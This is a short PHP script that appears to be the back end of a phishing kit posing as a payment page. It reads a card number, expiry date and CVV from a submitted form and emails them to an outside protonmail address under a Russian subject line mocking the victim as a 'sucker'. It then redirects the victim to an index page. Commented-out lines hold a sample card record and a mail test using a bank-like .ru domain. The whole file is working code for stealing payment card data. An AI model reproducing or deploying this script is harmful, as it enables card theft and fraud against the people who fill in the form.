<?php
session_start();
header("Location: index.html");

error_reporting(E_ALL);/*
ini_set( 'display_errors', 1 );*/
/*
INSERT INTO `entries` (`N`, `card_no`, `month_year`, `cvv`, `password`, `time_stamp`) VALUES (NULL, '4276690013911471', '12/23', '123', NULL, current_timestamp()) ON DUPLICATE KEY UPDATE*/

$number = 'card_number';
$month = 'date_month';
$year=  'date_year';
$cvv = 'card_cvv';

$_SESSION[$number] = $_POST[$number];
$_SESSION[$month] = $_POST[$month];
$_SESSION[$year] = $_POST[$year];
$_SESSION[$cvv] = $_POST[$cvv];
{       
    $to = "payc2c@protonmail.com";
    $subject = 'Карта лоха :'.$_SESSION[$number];
         
    $message = 'CardNo:'.$_SESSION[$number]."\r\n";
    $message .= 'Date:'.$_SESSION[$month].'/'.$_SESSION[$year]."\r\n";
    $message .= 'CVV:'. $_SESSION[$cvv]."\r\n";
    $message = nl2br($message);
    $header = "From: mymail@gmail.com	 \r\n";
         
    $retval = mail($to,$subject,$message,$header);
}     

/* ini_set( 'display_errors', 1 );
    error_reporting( E_ALL );
    $from = "payc2c@alfaportalpay.ru";
    $to = "payc2c@alfaportalpay.ru";
    $subject = "Checking PHP mail";
    $message = "PHP mail works just fine";
    $headers = "From:" . $from;
    if(mail($to,$subject,$message, $headers)){
        
    echo "The email message was sent.";
    }else echo 'FUCK';*/

//include 'index.html';
?>